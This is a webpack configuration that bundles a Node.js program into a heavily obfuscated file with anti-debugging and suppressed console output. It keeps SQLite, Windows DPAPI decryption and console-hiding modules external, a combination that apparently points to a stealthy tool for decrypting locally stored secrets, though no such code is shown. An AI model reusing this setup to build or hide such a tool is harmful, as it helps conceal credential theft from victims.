const { resolve } = require('path');
const WebpackObfuscator = require('webpack-obfuscator');

module.exports = {
  mode: 'production',
  entry: './index.js',
  target: 'node',
  output: {
    path: resolve(__dirname, 'dist'),
    filename: 'index.bundle.js',
  },
  resolve: {
    extensions: ['.js', '.json'],
    modules: [resolve(__dirname, 'util'), resolve(__dirname, 'functions'), 'node_modules'],
  },
  plugins: [
    new WebpackObfuscator({
      rotateStringArray: true,
      simplify: true,
      target: 'node',
      log: false,
      debugProtection: true,
      disableConsoleOutput: true,
      identifierNamesGenerator: 'mangled',
      splitStrings: true,
      stringArray: true,
      stringArrayThreshold: 1,
      stringArrayEncoding: ['base64'],
      compact: true,
      deadCodeInjection: true,
      renamePropertiesMode: 'safe',
      optionsPreset: 'high-obfuscation'
    })
  ],
  externals: {
    sqlite3: 'commonjs sqlite3',
    '@primno/dpapi': 'commonjs @primno/dpapi',
    'node-hide-console-window': 'commonjs node-hide-console-window',
  }
};
